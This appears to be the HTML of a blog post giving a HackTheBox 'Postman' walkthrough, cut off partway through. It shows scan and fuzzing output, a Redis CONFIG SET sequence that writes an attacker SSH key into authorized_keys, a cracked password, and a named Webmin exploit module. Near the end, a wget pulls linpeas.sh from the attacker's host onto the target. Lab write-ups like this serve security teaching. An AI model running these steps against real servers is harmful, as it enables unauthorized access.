@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      HackTheBox: Postman &middot; tralsesec
+    
+  </title>
+
+  <!-- CSS -->
+  <!--<link rel="stylesheet" href="public/css/poole.css">-->
+  <!--<link rel="stylesheet" href="public/css/blackdoc.css">-->
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/modern.css">
+  <!--<link rel="stylesheet" href="public/css/operator.css">-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=EB+Garamond">
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          tralsesec
+        </a>
+      </h1>
+      <p class="lead">Offensive Security Researcher · Malware Developer & Analyst · Exploit Developer · CTF Player</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/about">About</a>
+      <a class="sidebar-nav-item" href="/projects">Projects</a>
+      <a class="sidebar-nav-item" href="/anatomy-of-a-bug">Anatomy of a Bug</a>
+      <a class="sidebar-nav-item active" href="/ctfs">Capture the Flags</a>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+
+      <a class="sidebar-nav-item" href="https://x.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        X
+      </a>
+
+      <a class="sidebar-nav-item" href="https://github.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
+      </a>
+
+      <a class="sidebar-nav-item" href="https://app.hackthebox.com/public/users/475600" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M11.99 0l-10.4 6.02v12.01l10.4 6.02 10.4-6.02V6.02L11.99 0zM3.46 17.2V6.9l8.53-4.93 8.53 4.93v10.3l-8.53 4.93-8.53-4.93z"/><path d="M11.99 3.5L4.8 7.66v8.32l7.19 4.16 7.19-4.16V7.66L11.99 3.5zm5.72 11.53l-5.72 3.31-5.72-3.31V8.47l5.72-3.31 5.72 3.31v6.56z"/></svg>
+        HackTheBox
+      </a>
+
+    </nav>
+
+    <p style="margin-top: auto; padding-top: 2rem; margin-bottom: 0; font-size: 0.9rem;">
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title" style="line-height: 1.3; padding-bottom: 1.3rem;">HackTheBox: Postman</h1>
+
+  <div class="post-meta" style="font-family: var(--font-mono); font-size: 0.75em; margin-bottom: 2rem;">
+    
+      <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #LINUX
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #REDIS
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #JOHN
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #WEBMIN
+          </span>
+        
+        <span class="post-date" style="color: var(--fg-dim);">// 2026-05-12</span>
+      </div>
+    
+  </div>
+
+  
+     <div class="intel-frame" style="padding: 5px; background: #000; transition: transform 0.2s ease;">
+      <a href="/assets/img/ctf/postman.png" target="_blank" style="border: none; display: block;">
+        <img src="/assets/img/ctf/postman.png" style="width: 30%; border-color: #000; display: block; cursor: zoom-in; margin-left: auto; margin-right: auto;">
+      </a>
+    </div>   
+  
+
+  <br><br>
+
+  <h1 id="-postman">🎯 Postman</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>OS:</strong> Linux</td>
+      <td><strong>Difficulty:</strong> Easy</td>
+      <td><strong>IP:</strong> <code class="language-plaintext highlighter-rouge">10.129.2.1</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/ctf/data/postman-htb.png" alt="postman.htb" /></p>
+
+<hr />
+
+<h2 id="️-tldr--attack-chain">⛓️ TL;DR / Attack Chain</h2>
+<ol>
+  <li><strong>Foothold:</strong> Open Redis server with no authentication allowing users to write ssh keys to <code class="language-plaintext highlighter-rouge">/var/lib/redis/.ssh</code> allowing to authenticate via ssh.</li>
+  <li><strong>PrivEsc (Matt):</strong> Found Matt’s ssh private key in <code class="language-plaintext highlighter-rouge">/opt</code> encrypted. Cracked with <code class="language-plaintext highlighter-rouge">john</code>, found password: <code class="language-plaintext highlighter-rouge">computer2008</code>.</li>
+  <li><strong>PrivEsc (Root):</strong> Logged into <code class="language-plaintext highlighter-rouge">Webmin</code> (:10000) with <code class="language-plaintext highlighter-rouge">Matt</code>:<code class="language-plaintext highlighter-rouge">computer2008</code> and executed <code class="language-plaintext highlighter-rouge">linux/http/webmin_packageup_rce</code> in <code class="language-plaintext highlighter-rouge">msfconsole</code> giving us a root shell.</li>
+</ol>
+
+<hr />
+
+<h2 id="-loot--creds">🔑 Loot &amp; Creds</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">User</th>
+      <th style="text-align: left">Credential</th>
+      <th style="text-align: left">Where / How</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">Matt</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">computer2008</code></td>
+      <td style="text-align: left">Cracked encrypted <code class="language-plaintext highlighter-rouge">id_rsa.bak</code> found in <code class="language-plaintext highlighter-rouge">/opt</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="-0-setup--global-variables">🔧 0. Setup &amp; Global Variables</h2>
+<p><em>Run this in your terminal once so you can copy-paste the rest of the commands blindly.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ IP</span><span class="o">=</span><span class="s2">"10.129.2.1"</span> <span class="p">;</span> <span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">"postman.htb"</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$IP</span><span class="s2"> </span><span class="nv">$DOMAIN</span><span class="s2">"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-1-enumeration">🔍 1. Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> nmap <span class="o">&amp;&amp;</span> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nv">$IP</span> <span class="nt">-oA</span> ./nmap/nmap
+Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-05-12 14:56 +0200
+Nmap scan report <span class="k">for </span>postman.htb <span class="o">(</span>10.129.2.1<span class="o">)</span>
+Host is up <span class="o">(</span>0.028s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65531 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: The Cyber Geek<span class="s1">'s Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>58.09 seconds
+</code></pre></div></div>
+
+<h3 id="http80">HTTP/80</h3>
+
+<p><img src="/assets/img/ctf/data/postman-1.png" alt="postman-1" /></p>
+
+<p>Directory fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://<span class="nv">$DOMAIN</span>/FUZZ <span class="nt">-fs</span> 3844 | <span class="nb">tee</span> ./ffuf/dir.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://postman.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3844
+________________________________________________
+
+images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 36ms]
+upload                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 26ms]
+css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 25ms]
+js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 26ms]
+fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 27ms]
+server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 31ms]
+
+:: Progress: [220560/220560] :: Job [1/1] :: 769 req/sec :: Duration: [0:02:32] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/upload</code> has just a bunch of images:
+<img src="/assets/img/ctf/data/postman-2.png" alt="postman-2" /></p>
+
+<p>vhosts fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://<span class="nv">$DOMAIN</span>/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.</span><span class="nv">$DOMAIN</span><span class="s2">"</span> <span class="nt">-fs</span> 3844 | <span class="nb">tee</span> ./ffuf/vhosts.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://postman.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.postman.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3844
+________________________________________________
+
+:: Progress: [114442/114442] :: Job [1/1] :: 769 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<h3 id="http10000">HTTP/10000</h3>
+
+<p><img src="/assets/img/ctf/data/postman-3.png" alt="postman-3" /></p>
+
+<p>Trying login with <code class="language-plaintext highlighter-rouge">admin</code>:<code class="language-plaintext highlighter-rouge">admin</code>, <code class="language-plaintext highlighter-rouge">'</code>:<code class="language-plaintext highlighter-rouge">anything</code>, <code class="language-plaintext highlighter-rouge">tcg</code>:<code class="language-plaintext highlighter-rouge">tcg</code> but nothing working:
+<img src="/assets/img/ctf/data/postman-4.png" alt="postman-4" /></p>
+
+<p>tried exactly three logins until we were blocked by the system:
+<img src="/assets/img/ctf/data/postman-5.png" alt="postman-5" /></p>
+
+<p>Directory fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://<span class="nv">$DOMAIN</span>:10000/FUZZ <span class="nt">-fs</span> 172 | <span class="nb">tee</span> ./ffuf/dir_10000.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://postman.htb:10000/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 172
+________________________________________________
+
+:: Progress: [11073/220560] :: Job [1/1] :: 86 req/sec :: Duration: [0:03:57] :: Errors: 160 ::
+</span></code></pre></div></div>
+
+<p>vhosts fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ffuf <span class="o">&amp;&amp;</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://<span class="nv">$DOMAIN</span>:10000/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.</span><span class="nv">$DOMAIN</span><span class="s2">:10000"</span> <span class="nt">-fs</span> 172 | <span class="nb">tee</span> ./ffuf/vhosts_10000.scan
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://postman.htb:10000/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.postman.htb:10000
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 172
+________________________________________________
+
+:: Progress: [12157/114442] :: Job [1/1] :: 86 req/sec :: Duration: [0:03:56] :: Errors: 160 ::
+</span></code></pre></div></div>
+
+<p>The errors actually were triggered when we were blocked by the server for having the wrong credentials for three times.</p>
+
+<h3 id="http6379">HTTP/6379</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--script</span> redis-info,redis-brute,vuln <span class="nt">-sV</span> <span class="nt">-p</span> 6379 <span class="nv">$IP</span> <span class="nt">-oA</span> ./nmap/nmap_redis
+Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-05-12 15:12 +0200
+Nmap scan report <span class="k">for </span>postman.htb <span class="o">(</span>10.129.2.1<span class="o">)</span>
+Host is up <span class="o">(</span>0.026s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 4.0.9 <span class="o">(</span>64 bits<span class="o">)</span>
+| redis-info:
+|   Version: 4.0.9
+|   Operating System: Linux 4.15.0-58-generic x86_64
+|   Architecture: 64 bits
+|   Process ID: 653
+|   Used CPU <span class="o">(</span>sys<span class="o">)</span>: 1.01
+|   Used CPU <span class="o">(</span>user<span class="o">)</span>: 0.33
+|   Connected clients: 1
+|   Connected slaves: 0
+|   Used memory: 821.70K
+|   Role: master
+|   Bind addresses:
+|     0.0.0.0
+|     ::1
+|   Client connections:
+|_    10.10.14.219
+| vulners:
+|   cpe:/a:redislabs:redis:4.0.9:
+|     	CVE-2018-11219	9.8	https://vulners.com/cve/CVE-2018-11219
+|     	CVE-2018-11218	9.8	https://vulners.com/cve/CVE-2018-11218
+|     	CVE-2021-21309	8.8	https://vulners.com/cve/CVE-2021-21309
+|     	EDB-ID:44904	8.4	https://vulners.com/exploitdb/EDB-ID:44904	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+|     	CVE-2018-12326	8.4	https://vulners.com/cve/CVE-2018-12326
+|     	CVE-2020-14147	7.7	https://vulners.com/cve/CVE-2020-14147
+|     	EDB-ID:44908	7.5	https://vulners.com/exploitdb/EDB-ID:44908	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+|     	CVE-2021-32761	7.5	https://vulners.com/cve/CVE-2021-32761
+|     	CVE-2018-12453	7.5	https://vulners.com/cve/CVE-2018-12453
+|     	CVE-2019-10193	7.2	https://vulners.com/cve/CVE-2019-10193
+|     	CVE-2019-10192	7.2	https://vulners.com/cve/CVE-2019-10192
+|     	CVE-2021-3470	5.3	https://vulners.com/cve/CVE-2021-3470
+|     	EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2	5.0	https://vulners.com/exploitpack/EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+|     	EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2	4.6	https://vulners.com/exploitpack/EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+|     	PACKETSTORM:148270	0.0	https://vulners.com/packetstorm/PACKETSTORM:148270	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+|     	PACKETSTORM:148225	0.0	https://vulners.com/packetstorm/PACKETSTORM:148225	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+|     	1337DAY-ID-30603	0.0	https://vulners.com/zdt/1337DAY-ID-30603	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+|_    	1337DAY-ID-30598	0.0	https://vulners.com/zdt/1337DAY-ID-30598	<span class="k">*</span>EXPLOIT<span class="k">*</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.79 seconds
+</code></pre></div></div>
+
+<p>We gotta enumerate manually then:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc postman.htb 6379
+info
+<span class="nv">$2725</span>
+<span class="c"># Server</span>
+redis_version:4.0.9
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:9435c3c2879311f3
+redis_mode:standalone
+os:Linux 4.15.0-58-generic x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:7.4.0
+process_id:653
+run_id:0879a880e8569aedc856562571f4dba593486290
+tcp_port:6379
+uptime_in_seconds:1860
+uptime_in_days:0
+hz:10
+lru_clock:207388
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+
+<span class="c"># Clients</span>
+connected_clients:1
+client_longest_output_list:0
+client_biggest_input_buf:0
+blocked_clients:0
+
+<span class="c"># Memory</span>
+used_memory:841360
+used_memory_human:821.64K
+used_memory_rss:2580480
+used_memory_rss_human:2.46M
+used_memory_peak:862296
+used_memory_peak_human:842.09K
+used_memory_peak_perc:97.57%
+used_memory_overhead:832086
+used_memory_startup:782456
+used_memory_dataset:9274
+used_memory_dataset_perc:15.74%
+total_system_memory:941203456
+total_system_memory_human:897.60M
+used_memory_lua:41984
+used_memory_lua_human:41.00K
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+mem_fragmentation_ratio:3.07
+mem_allocator:jemalloc-3.6.0
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+<span class="c"># Persistence</span>
+loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1778590424
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:-1
+rdb_current_bgsave_time_sec:-1
+rdb_last_cow_size:0
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+aof_last_cow_size:0
+
+<span class="c"># Stats</span>
+total_connections_received:9
+total_commands_processed:31
+instantaneous_ops_per_sec:0
+total_net_input_bytes:835
+total_net_output_bytes:39005
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:0
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+
+<span class="c"># Replication</span>
+role:master
+connected_slaves:0
+master_replid:3d0bebf0089637821bc72c364376b9837eb8b7f5
+master_replid2:0000000000000000000000000000000000000000
+master_repl_offset:0
+second_repl_offset:-1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+<span class="c"># CPU</span>
+used_cpu_sys:1.63
+used_cpu_user:0.54
+used_cpu_sys_children:0.00
+used_cpu_user_children:0.00
+
+<span class="c"># Cluster</span>
+cluster_enabled:0
+
+<span class="c"># Keyspace</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-2-initial-foothold">🚪 2. Initial Foothold</h2>
+
+<p>In the <code class="language-plaintext highlighter-rouge">redis</code>-netcat connection, I tried the following:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CONFIG SET <span class="nb">dir</span> /var/lib/redis/.ssh
++OK
+
+CONFIG SET dbfilename authorized_keys
++OK
+
+CONFIG SET <span class="nb">dir</span> /root/.ssh
+<span class="nt">-ERR</span> Changing directory: Permission denied
+
+config get <span class="nb">dir</span>
+<span class="k">*</span>2
+<span class="nv">$3</span>
+<span class="nb">dir</span>
+<span class="nv">$19</span>
+/var/lib/redis/.ssh
+
+config get dbfilename
+<span class="k">*</span>2
+<span class="nv">$10</span>
+dbfilename
+<span class="nv">$15</span>
+authorized_keys
+
+SET crack <span class="s2">"</span><span class="se">\n\n\n</span><span class="s2">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKsKkyQkLwlH3Gh1Q1nSd5NKcJzg39oeW/D7S+L84Wu tralsesec@omarchy</span><span class="se">\n\n\n</span><span class="s2">"</span>
++OK
+
+SAVE
++OK
+
+get crack
+<span class="nv">$104</span>
+
+
+
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKsKkyQkLwlH3Gh1Q1nSd5NKcJzg39oeW/D7S+L84Wu tralsesec@omarchy
+
+
+
+
+
+</code></pre></div></div>
+
+<p>Then authenticated using ssh:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> ~/.ssh/id_ed25519 redis@postman.htb
+<span class="k">**</span> WARNING: connection is not using a post-quantum key exchange algorithm.
+<span class="k">**</span> This session may be vulnerable to <span class="s2">"store now, decrypt later"</span> attacks.
+<span class="k">**</span> The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase <span class="k">for </span>key <span class="s1">'/home/tralsesec/.ssh/id_ed25519'</span>:
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-58-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>The vulnerability here is that redis:</p>
+<ol>
+  <li>Has no authentication</li>
+  <li>Allows users to use the <code class="language-plaintext highlighter-rouge">CONFIG</code> commands</li>
+</ol>
+
+<p>We abused both and were allowed to write our own ssh public key into <code class="language-plaintext highlighter-rouge">/var/lib/redis/.ssh</code>.</p>
+
+<hr />
+
+<h2 id="-31-privilege-escalation-redis---matt">📈 3.1 Privilege Escalation (<code class="language-plaintext highlighter-rouge">redis</code> -&gt; <code class="language-plaintext highlighter-rouge">Matt</code>)</h2>
+
+<p>Upload <code class="language-plaintext highlighter-rouge">linpeas.sh</code> and let it enumerate:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:~<span class="nv">$ </span>wget http://10.10.14.219:1101/linpeas.sh
+<span class="nt">--2026-05-12</span> 14:35:42--  http://10.10.14.219:1101/linpeas.sh
+Connecting to 10.10.14.219:1101... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1031313 <span class="o">(</span>1007K<span class="o">)</span> <span class="o">[</span>application/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                     100%[<span class="o">==================================================&gt;]</span>   1007K  2.16MB/s    <span class="k">in </span>0.5s
+
